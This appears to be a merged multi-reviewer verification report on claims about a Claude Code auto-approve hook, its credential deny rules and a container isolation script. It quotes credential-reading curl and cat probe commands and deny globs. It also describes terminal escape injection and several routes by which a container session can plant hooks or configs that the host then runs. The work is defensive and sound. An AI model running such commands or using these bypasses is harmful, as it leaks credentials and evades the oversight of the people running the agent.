**Location:** `hooks/auto-approve-allowed-commands.sh:118-119`
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers file-set parity with `get_allowed_prefixes`. It does not establish that Claude Code reads deny rules only from these files: managed or policy settings are read by neither function.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r1+r2+r3: "managed or enterprise settings are read by neither function."
- r3 (compound): verdicted together with `--deny` (Claim 35).
**Legibility-target:** for-orchestrator-synthesis

Both functions read `$HOME/.claude/settings.json`, then `$git_root/.claude/settings.json` and `settings.local.json`, falling back to the cwd-relative files when there is no git root (`:125-136` vs `:167-178`). r2 also executed "deny rules from the project settings are honored", which passes.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:113-137`, `hooks/auto-approve-allowed-commands.sh:156-179`; `docs/reviews/execution-logs/r2-auto-approve-bats.log`

---

## Claim 44: "True when the string matches any deny glob. The right-hand side of == is left unquoted on purpose, so bash matches it as a glob."

**Location:** `hooks/auto-approve-allowed-commands.sh:139-140`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers glob matching, including across newlines (a multi-line command matched `*.credentials.json*` in the probe). It does not cover extglob, which is not enabled.
**Replicate verdicts:** r1=— · r2=Verified · r3=— · single-replicate detection
**Replicate annotations:** none
**Legibility-target:** for-orchestrator-synthesis

The comparison is `if [[ "$str" == $glob ]]; then` (`:147`). The two-line probe `echo hi\ncat /h/.claude/.credentials.json` gives no allow.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:141-154`; `docs/reviews/execution-logs/r2-auto-approve-probes.log`

---

## Claim 45: "The raw string is checked here, and each extracted command again below."

**Location:** `hooks/auto-approve-allowed-commands.sh:247-248`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers both check sites, which run before any `allow` emission, including the "No commands found, allowing" branch. It does not establish what happens if the deny list fails to load: `mapfile` from a failed `get_deny_globs` yields an empty list, which fails open.
**Replicate verdicts:** r1=Verified · r2=Verified (compound) · r3=—
**Replicate annotations:**
- r2 (compound with `:45-47`): "Mutating `matches_deny` fails 4 of the 14 cases (9, 10, 11 and 13), including the pipeline case where only the extracted `rm -rf x` matches."
**Legibility-target:** for-orchestrator-synthesis

The raw check is at `:249-253` and the per-extracted-command check at `:300-303`. The test `a legacy prefix deny rule blocks an extracted command inside a pipeline` passes, and it fails under the mutation.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:247-253`, `hooks/auto-approve-allowed-commands.sh:268-275`, `hooks/auto-approve-allowed-commands.sh:300-303`; `…/scratchpad/logs/mutation-matches_deny.log`, `docs/reviews/execution-logs/r2-auto-approve-mutation.log`

---

## Claim 46: "Read() rules do not cover Bash, and cc-isolated has no sandbox to deny the read, so without it `curl -d @~/.claude/.credentials.json` nested where the auto-approve hook does not look (e.g. inside $(( ))) ran with no prompt."

**Location:** `hooks/wiring.json:38-41`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the example command's spelling, the hook behaviour, and the rule's presence in the merged settings (`link-claude-home-wiring.bats`, 16/16). It does not establish "Read() rules do not cover Bash", which is Claude Code behaviour and was not checked.
**Replicate verdicts:** r1=Mostly accurate (compound) · r2=Unverifiable · r3=Unverifiable (compound)
**Replicate annotations:**
- r1+r2+r3: "'Read() rules do not cover Bash' is Claude Code runtime behaviour and is not established."
- r2: "the 'no sandbox' half is covered by its Claim 10a (Verified; Claim 28 here). To verify the rest: the Claude Code permissions docs, or a live `cat` of a Read-denied path on the host with no Bash deny rule."
- r3 (compound): "whether the command actually 'ran with no prompt', and #39344, need a live Claude Code host and network. The hook half (the hook returns `allow` for the `$(( ))` curl with no Bash deny rule) is verified."
- r1 (compound): verdicted together with `hooks/wiring.json:42-43` (Claim 47).
**Legibility-target:** for-author

The mechanism is right, but the example is mis-spelled. Bash does not tilde-expand after `@`: `bash -c 'printf "%s\n" curl -d @~/x'` printed `@~/x`. So `curl -d @~/.claude/.credentials.json` would not read the credentials file. The reproduction that was actually auto-approved uses `@$HOME/.claude/.credentials.json` (`test/auto-approve-allowed-commands.bats:118`).

**Evidence:** `hooks/wiring.json:38-43`, `test/auto-approve-allowed-commands.bats:118`, `test/link-claude-home-wiring.bats:266-275`; `…/scratchpad/logs/probe_hook.log`, `…/scratchpad/logs/link-claude-home-wiring.log`

---

## Claim 47: "auto-approve-allowed-commands.sh reads Bash deny rules and never approves a match. It is a string match: any spelling that does not contain the literal name … gets past."

**Location:** `hooks/wiring.json:42-43`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the hook behaviour for the wired rule. "Never approves a match" carries the glob-syntax qualifier from Claim 27 (`?` and `[…]` are read as bash glob syntax).
**Replicate verdicts:** r1=Mostly accurate (compound) · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r2 (Verified): "the bats case at :172 takes the deny list exactly as wiring.json ships it (`jq -c '.permissions.deny'`) and passes. It does not establish rendering by link-claude-home.sh beyond the merge test."
- r3 (compound Verified, with the hook's `:50-52` and `docs/decisions/log.md:76`): "none of the bypass spellings contains the literal substring; only the quote-split form is pinned."
**Legibility-target:** for-author

r1: the hook would still refuse to approve the `@~` spelling, because it contains the literal name. "Never approves a match" carries Claim 27's qualifier.

**Evidence:** `hooks/wiring.json:38-43`, `hooks/wiring.json:130`, `test/auto-approve-allowed-commands.bats:169-177`; `…/scratchpad/logs/probe_hook2.log`, `docs/reviews/execution-logs/r2-auto-approve-bats.log`

---

## Claim 48: "report-dependent BATS suite(s) NOT RUN — … generate with test/skills/generate-reports.bash <skill>, then commit output/"

**Location:** `scripts/health-check.sh:407`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers whether the advice is consistent with `.gitignore`: committing `output/` stages only the four tracked suffixes. It does not establish the NOT RUN count logic, which this diff did not change.
**Replicate verdicts:** r1=Verified · r2=Verified (compound) · r3=Verified (compound)
**Replicate annotations:**
- r1+r2: "the warning's firing conditions are unchanged by this diff and were not executed."
- r2+r3 (compound): verdicted together with `scripts/run-tests.sh` (and, for r3, with generate-reports and skill-creation).
**Legibility-target:** for-orchestrator-synthesis

`git add test/skills/<skill>/output/` picks up only files not matched by `.gitignore:8`, which are the four negated suffixes. The generator writes to `OUTPUT_DIR="$SCRIPT_DIR/${SKILL}/output"` (`test/skills/generate-reports.bash:103`).

**Evidence:** `scripts/health-check.sh:406-408`, `.gitignore:8-12`, `test/skills/generate-reports.bash:103`

---

## Claim 49: "Generate reports with test/skills/generate-reports.bash <skill> and commit what it writes to output/ (reports are tracked; Q-071 [1])."

**Location:** `scripts/run-tests.sh:99-101`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers trackability, the same point as Claim 48. It does not establish that any report is currently tracked (none is).
**Replicate verdicts:** r1=Verified · r2=Verified (compound) · r3=Verified (compound)
**Replicate annotations:**
- r1+r3: "no report is currently committed (`git ls-files 'test/skills/*/output/*'` is empty)."
**Legibility-target:** for-orchestrator-synthesis

This relies on the same `.gitignore` negation set as Claim 1.

**Evidence:** `scripts/run-tests.sh:95-104`, `.gitignore:8-12`

---

## Claim 50: "Each planted command touches a marker under $TEST_TMPDIR/ran; the scan must name the item AND leave no marker"

**Location:** `test/cc-isolated-functions.bats:1150-1151`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** static
**Scope:** Covers which cases plant a marker and which assert that it is absent.
**Replicate verdicts:** r1=— · r2=Mostly accurate · r3=— · single-replicate detection
**Replicate annotations:**
- r2: "precise version: 'Planted commands in the hook/fsmonitor/filter/include cases touch a marker…'."
**Legibility-target:** for-author

The no-marker assertion appears only in the hook, fsmonitor, filter and include cases (`:1177`, `:1203`, `:1219`, `:1236`). The core.hooksPath case plants a hook that writes a marker but does not assert that the marker is absent (`:1188-1196`). The sshCommand plant (`:1242`) touches no marker.

**Evidence:** `test/cc-isolated-functions.bats:1150-1247`

---

## Claim 51: "T3 provenance stamps: a report whose skill, runner or fixture changed since generation fails; so does one with no stamp. The shared runner-contract.bash is not stamped (Q-071 [1]), and the reports and their sidecars are tracked by git."

**Location:** `test/skills/eval-helpers-freshness.bats:6-9`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers what the suite asserts. "Tracked" means not gitignored, which is what the test checks; it does not mean that any report exists in the index.
**Replicate verdicts:** r1=Verified · r2=— · r3=— · single-replicate detection
**Replicate annotations:** none
**Legibility-target:** for-orchestrator-synthesis

The four stamp tests pass (32/32).

**Evidence:** `test/skills/eval-helpers-freshness.bats:6-9`, `test/skills/eval-helpers-freshness.bats:71-119`; `…/scratchpad/logs/eval-helpers-freshness.log`

---

## Claim 52: "All of these are committed (Q-071 [1]; see .gitignore): the suites read every one, so a fresh clone grades the same reports, and a report is regenerated only when its skill, runner or fixture changes."

**Location:** `test/skills/generate-reports.bash:16-19`
**Type:** Configuration
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** static
**Scope:** Covers trackability and which inputs force regeneration. It does not hold as a present-tense "are committed": zero output files are tracked at ce6bee6. Nothing prevents voluntary regeneration either.
**Replicate verdicts:** r1=Mostly accurate · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r2 (Verified, executed): "covers trackability and that the suites read `.stamp`, `.failed` and `.transcript.jsonl`. It does not establish that any report is currently committed."
- r3 (compound Verified): "does not establish that any reports are currently committed."
**Legibility-target:** for-author

`git ls-files 'test/skills/*/output/*'` returned nothing. The precise wording is "are tracked once generated (see .gitignore)".

**Evidence:** `test/skills/generate-reports.bash:16-19`, `.gitignore:8-12`; `docs/reviews/execution-logs/r2-gitignore-check.log`

---

## Claim 53: report_stamp stamps exactly skill, runner and fixture: "Only the skill's own inputs are stamped … Shared harness files are deliberately not stamped: this file, generate-reports.bash, transcript.jq."

**Location:** `test/skills/runner-contract.bash:182-203`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the stamp's lines and the three named harness files. It does not establish that generate-reports.bash and transcript.jq were ever stamped; they were not, since the old stamp had only skill, runner, contract and fixture. "Now unstamped" is new only for runner-contract.bash.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r1: "does not cover the pre-existing 'not covered' note about tree-mode fixture_base files, which this diff did not change."
- r3: "checked: no `runner.bash` sources another harness file (`generate-reports.bash` sources only `runner-contract.bash` and the per-skill `runner.bash`, :116 and :119)."
- r3 (compound): verdicted together with the old-format note (Claim 55).
**Legibility-target:** for-orchestrator-synthesis

`report_stamp` prints `skill`, `runner` and `fixture` lines (`:198-203`). `bats test/skills/eval-helpers-freshness.bats test/generate-reports.bats` passes 81/81, including "editing the shared runner-contract.bash does not stale a report".

**Evidence:** `test/skills/runner-contract.bash:181-203`, `test/skills/eval-helpers-freshness.bats:93-100`, `test/generate-reports.bats:374-377`; `docs/reviews/execution-logs/r2-stamp-bats.log`, `…/scratchpad/logs/generate-reports.log`

---

## Claim 54: "Stamping this file made every edit to it stale every skill's reports"

**Location:** `test/skills/runner-contract.bash:192-194`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the old code's mechanism: a `contract` line hashing runner-contract.bash was in every stamp. It does not establish how many edits actually staled committed reports (see Claim 59).
**Replicate verdicts:** r1=Verified · r2=— · r3=— · single-replicate detection
**Replicate annotations:** none
**Legibility-target:** for-orchestrator-synthesis

The removed line was `printf 'contract %s\n' "$(_stamp_hash_path "$sk/runner-contract.bash")"`, which was shared by every skill's stamp. `check_report_stamp` fails on any line mismatch.

**Evidence:** `test/skills/runner-contract.bash:192-194`, `test/skills/runner-contract.bash:211-225`

---

## Claim 55: "A stamp in an older format (one that also stamped the contract) reads as stale: "stamp format"."

**Location:** `test/skills/runner-contract.bash:209-210`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers old stamps whose three shared inputs are unchanged. If an input also changed, the message names that input instead, which is still a stale failure.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r2: "also verdicts commit 01c40eb's 'an old 4-line stamp reads as stale ('stamp format')'."
- r1+r2: "the bats test appends `contract` at the end rather than in the old order, which exercises the same path."
**Legibility-target:** for-orchestrator-synthesis

All three replicates reproduced the real old order (skill, runner, contract, fixture) and got `changed since generation: stamp format.` with rc=1. After an input edit, r2 got `…: fixture.` and r3 got `…: skill.`.

**Evidence:** `test/skills/runner-contract.bash:209-225`, `test/skills/eval-helpers-freshness.bats:102-108`; `…/scratchpad/logs/extra.log` (X5), `docs/reviews/execution-logs/r2-old-stamp.log`, `$SP/r3logs/stamp-probe.log`

---

## Claim 56: "hooks/wiring.json: permissions.deny gains Bash(*.credentials.json*), merged into settings.json by link-claude-home.sh (and shipped to bare hosts)"

**Location:** commit `0864452` message
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the merge (idempotent) and the fact that install.sh copies wiring.json. It does not establish a bare host's own settings merge.
**Replicate verdicts:** r1=— · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r3 (compound with `hooks/wiring.json:130`): "does not establish how Claude Code itself interprets a leading-`*` Bash rule."
**Legibility-target:** for-orchestrator-synthesis

The bats case "the merged settings carry the Bash deny rule for the credentials file" asserts a count of 1 after two runs and passes. install.sh compares and installs `hooks/wiring.json` (`devcontainer-config/install.sh:986`).

**Evidence:** `test/link-claude-home-wiring.bats:266-275`, `devcontainer-config/install.sh:986`, `hooks/wiring.json:128-131`; `$SP/r3logs/link-claude-home-wiring.log`

---

## Claim 57: "Tests: auto-approve-allowed-commands.bats 14/14 (7 new; mutating matches_deny fails 4 of them), link-claude-home-wiring.bats 16/16 (1 new), health-check + test/hooks 207/207, cross-ref/guide-index/sandbox-map 9/9."

**Location:** commit `0864452` message
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the counts at ce6bee6. The counts for these files are unchanged since 0864452, except for `5f70e0f`'s setup/teardown stub, which adds no tests.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified
**Replicate annotations:**
- r2: "the 207 and 9 pass results were not re-run; only their counts were checked."
- r3: "pass status at HEAD: 216 `ok` lines (207+9). Pass status at 0864452 itself is not established."
**Legibility-target:** for-orchestrator-synthesis

- auto-approve: 14 ok, 7 added, and the mutation fails tests 9, 10, 11 and 13.
- link-claude-home-wiring: 16 ok, 1 added.
- `test/hooks/` has 175 and `health-check.bats` 32, giving 207. The three cross-reference suites have 1 + 1 + 7 = 9.

**Evidence:** `test/auto-approve-allowed-commands.bats:111-186`, `test/link-claude-home-wiring.bats:266-275`; `…/scratchpad/logs/mutation-matches_deny.log`, `docs/reviews/execution-logs/r2-auto-approve-mutation.log`, `$SP/r3logs/mutation.log`, `$SP/r3logs/hooks-healthcheck.log`

---

## Claim 58: "Legacy Bash(x:*) deny rules are read as globs x*, which over-matches (rm:* also covers rmdir). That only costs a prompt."

**Location:** commit `0864452` message
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the over-match for `rm:*`/`rmdir`. It does not establish other divergences from Claude Code's semantics (Claim 27).
**Replicate verdicts:** r1=Verified · r2=Verified (compound) · r3=Verified (compound)
**Replicate annotations:**
- r3: "does not establish Claude Code's own `:*` semantics."
- r2+r3 (compound): verdicted together with the hook comment at `:104-105` (Claim 41).
**Legibility-target:** for-orchestrator-synthesis

`rmdir x` with deny `Bash(rm:*)` and allow `Bash(rmdir:*)` produced no allow output. All three replicates probed this.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:106-110`; `…/scratchpad/logs/probe_hook.log`, `docs/reviews/execution-logs/r2-auto-approve-probes.log`, `$SP/r3logs/hook-probe.log`

---

## Claim 59: "report_stamp hashed the shared test/skills/runner-contract.bash, so every edit to that file (8 in 30 days) staled every skill's reports and failed all the @needs-reports suites."

**Location:** commit `01c40eb` message
**Type:** Reference / Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the edit count and the mechanism. It does not hold as a historical statement that those 8 edits staled reports.
**Replicate verdicts:** r1=Mostly accurate · r2=Verified (compound) · r3=—
**Replicate annotations:**
- r2 (compound Verified, with "No reports regenerated"): "count = 8 (all dated 2026-09-24..26). 'Staled every skill's reports' follows from the old stamp including the contract hash and was not re-executed."
**Legibility-target:** for-author

`git log --since=2026-08-28 --until=2026-09-27 main -- test/skills/runner-contract.bash` lists 8 commits. However, `report_stamp` itself was introduced by the latest of them, 48680e2 (per `git log -S'report_stamp()'`). The other 7 edits predate stamps, so none of them could have staled a report. Precise version: "8 edits in 30 days, each of which would have staled every report".

**Evidence:** `test/skills/runner-contract.bash:182-203` (git history)

---

## Claim 60: "No reports regenerated (no model runs before A8)."

**Location:** commit `01c40eb` message
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the tree at ce6bee6. It does not establish anything about untracked local output directories.
**Replicate verdicts:** r1=Verified · r2=Verified (compound) · r3=—
**Replicate annotations:**
- r2 (compound, with Claim 59): "`git ls-files | grep -c /output/` gives 0."
**Legibility-target:** for-orchestrator-synthesis

`git ls-files 'test/skills/*/output/*'` is empty, and the commit's stat touches no `output/` path.

**Evidence:** `.gitignore:8-12`

---

## Claim 61: "a recording stub on PATH also fails the test if one is ever executed."

**Location:** commit `5f70e0f` message
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers `curl` resolved through PATH. It does not cover an absolute-path `/usr/bin/curl`, though the hook only parses strings.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=—
**Replicate annotations:**
- r2 (Confidence Medium): "a failing teardown fails the test in bats-core (framework behaviour, not repo code)."
**Legibility-target:** for-orchestrator-synthesis

The stub appends to `curl.ran`, and `teardown()` fails when that file exists (`test/auto-approve-allowed-commands.bats:21-33`).

**Evidence:** `test/auto-approve-allowed-commands.bats:18-33`

---

## Claim 62: "Tests: 17 new bats cases (…)" and "Live-verified: no — bats with a stubbed devcontainer CLI only"

**Location:** commit `37cae85` message
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the count and the stubbed-only statement. The same message's "Anything new or changed … is named" carries Claim 2's Incorrect verdict and is not re-verdicted here.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified
**Replicate annotations:**
- r2: "the commit's parenthetical list omits the `*.sample` case, but the total of 17 is right."
- r3: "minor: the sshCommand test asserts only that the key is named, not that it was 'not executed' as the commit's summary wording suggests."
- r3: "does not establish that no live run happened (a self-report, consistent with the repo)."
**Legibility-target:** for-orchestrator-synthesis

`test/cc-isolated-functions.bats` has 92 tests on main and 109 at HEAD, and all 17 new ones pass. The suite stubs `devcontainer` (`smart_devcontainer_stub`).

**Evidence:** `test/cc-isolated-functions.bats:7-9`, `test/cc-isolated-functions.bats:908-932`, `test/cc-isolated-functions.bats:1166-1380`; `…/scratchpad/logs/cc-isolated-functions.log`, `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`

---

## Claim 63: "Control bytes in container-chosen names/values are shown as '?'" — the session-exit warning

**Location:** commit `37cae85` message
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the exit-scan warnings (Claim 10).
**Replicate verdicts:** r1=— · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r3 (compound with `cc-isolated.sh:673-677`): "covers both output blocks of `git_exit_scan`, including the could-not-read warning, which includes the snapshot's stderr reason."
**Legibility-target:** for-orchestrator-synthesis

Both `git_exit_scan` output blocks pipe through `scan_vis`, and the control-byte suite case passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:682-715`; `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`

---

## Claim 64: "Control bytes in container-chosen names/values are shown as '?'" — read as covering the launch-time snapshot failure

**Location:** commit `37cae85` message
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the launch-time path, where a name planted by an earlier session is echoed. It does not establish exploitability beyond terminal escape injection.
**Replicate verdicts:** r1=— · r2=Incorrect · r3=Incorrect
**Replicate annotations:**
- r3: "does not establish whether any terminal in use actually acts on the bytes. A previous session can plant such a file, so the next launch prints it unfiltered."
**Legibility-target:** for-author

At launch, `git_exec_snapshot`'s stderr is not filtered (`:809`). Its reasons embed container-chosen paths, e.g. `echo "cannot read hook $f" >&2` (`:648`). r2 and r3 each ran a mode-000 hook with ESC in its name (`pre-push\033[2J` in r2, `x\033[2Jy` in r3); the snapshot returned 1, and its stderr contains a raw `033 [ 2 J` sequence (`od -c`).

**Evidence:** `devcontainer-config/cc-isolated.sh:603`, `devcontainer-config/cc-isolated.sh:646-650`, `devcontainer-config/cc-isolated.sh:806-814`; `docs/reviews/execution-logs/r2-launch-ctlbytes.log`, `$SP/r3logs/launch-ctrl.log`

---

## Escalations

These escalations are for the orchestrator to route; each entry names who should receive it.

1. **A hooks dir that can be searched but not listed hides a planted hook.** The scan returns 0 (not 2 or 4) and host `git commit`/`git push` runs the hook.
   - Paths: `devcontainer-config/cc-isolated.sh:595-598`, `:642-659`, `guides/cc-isolated-usage.md:52`, `guides/cc-isolated-usage.md:166-176`, `guides/cc-isolated-usage.md:179-189` (Claims 9, 18, 21, 23).
   - Raised by: r1 (Escalate, its Claims 8, 15b and 18), r2 (Escalate, its Claim 6), r3 (Escalate, its Claim 7).
   - Addressee: **security-reviewer**. r1 and r2 named security-reviewer; r2 also named "the author"; r3 named no critic.
2. **`remote.*.receivepack` is not scanned.** It runs a program on host `git push`, including under the guide's `-c core.hooksPath=/dev/null -c core.fsmonitor=false push`.
   - Paths: `devcontainer-config/cc-isolated.sh:554-558`, `:565`, `:709-711`, `guides/cc-isolated-usage.md:190-194` (Claims 5, 12, 25).
   - Raised by: r1 (Escalate, its Claim 5), r2 (Escalate, its Claim 3b), r3 (Escalate, its Claim 4).
   - Addressee: **security-reviewer**. Named by r1 and r2; r3 named no critic.
3. **`remote.*.pushurl` can be repointed to a session-built bare repo with a `post-receive` hook**, which a plain host `git push` runs.
   - Paths: `devcontainer-config/cc-isolated.sh:554-558`, `:565` (Claims 2, 5).
   - Raised by: r1 (Escalate).
   - Addressee: **security-reviewer**.
4. **Submodule git dirs (`.git/modules/<n>/config` and hooks) are not scanned.** A planted `core.fsmonitor` there runs on a plain host `git status`.
   - Paths: `devcontainer-config/cc-isolated.sh:614-618`, `guides/cc-isolated-usage.md:187-189` (Claims 2, 5, 24).
   - Raised by: r1 (Escalate, its Claims 2 and 18), r3 (Escalate, its Claim 4).
   - Addressee: **security-reviewer**. Named by r1; r3 named no critic.
5. **Whether the exit-scan key list should grow**, beyond the one receivepack/uploadpack example.
   - Path: `devcontainer-config/cc-isolated.sh:565`.
   - Raised by: r2 (Out of scope: "which is for the security critic").
   - Addressee: **security-reviewer**.

---

## Verdict stability

- **Total clusters:** 64.
- **All reporting replicates agreed:** 47. This includes 7 single-replicate clusters, where agreement is trivial: Claims 2, 11, 42, 44, 50, 51 and 54.
- **Disagreeing clusters:** 17. `(c)` marks a compound verdict.

| Claim | r1 | r2 | r3 | Merged |
|---|---|---|---|---|
| 15 | Verified (c) | Unverifiable | Verified (c) | Unverifiable |
| 18 | Incorrect | Verified (c) | Verified (c) | Incorrect |
| 21 | Mostly accurate | Incorrect | Incorrect (c) | Incorrect |
| 23 | Incorrect (c) | Verified (c) | Verified | Incorrect |
| 24 | Incorrect (c) | Verified (c) | Mostly accurate | Incorrect |
| 27 | Mostly accurate | Verified | Mostly accurate (c) | Mostly accurate |
| 28 | Unverifiable (c) | Verified | Verified (c) | Unverifiable |
| 30 | Verified (c) | — | Mostly accurate (c) | Mostly accurate |
| 32 | Verified (c) | Mostly accurate | Verified (c) | Mostly accurate |
| 33 | Mostly accurate | Mostly accurate | Verified (c) | Mostly accurate |
| 36 | Unverifiable (c) | Verified (c) | Verified (c) | Unverifiable |
| 38 | Verified (c) | Verified (c) | Mostly accurate (c) | Mostly accurate |
| 40 | Mostly accurate | Verified | Verified (c) | Mostly accurate |
| 46 | Mostly accurate (c) | Unverifiable | Unverifiable (c) | Mostly accurate |
| 47 | Mostly accurate (c) | Verified | Verified (c) | Mostly accurate |
| 52 | Mostly accurate | Verified | Verified (c) | Mostly accurate |
| 59 | Mostly accurate | Verified (c) | — | Mostly accurate |

- **Agreement rate:** 47/64 = 73.4%. Excluding the single-replicate clusters, it is 40/57 = 70.2%.
- **Headline counts:** each replicate's header counts come from its own report. r2's header says 47 claims, but the r2 report has 45 `## Claim` sections.
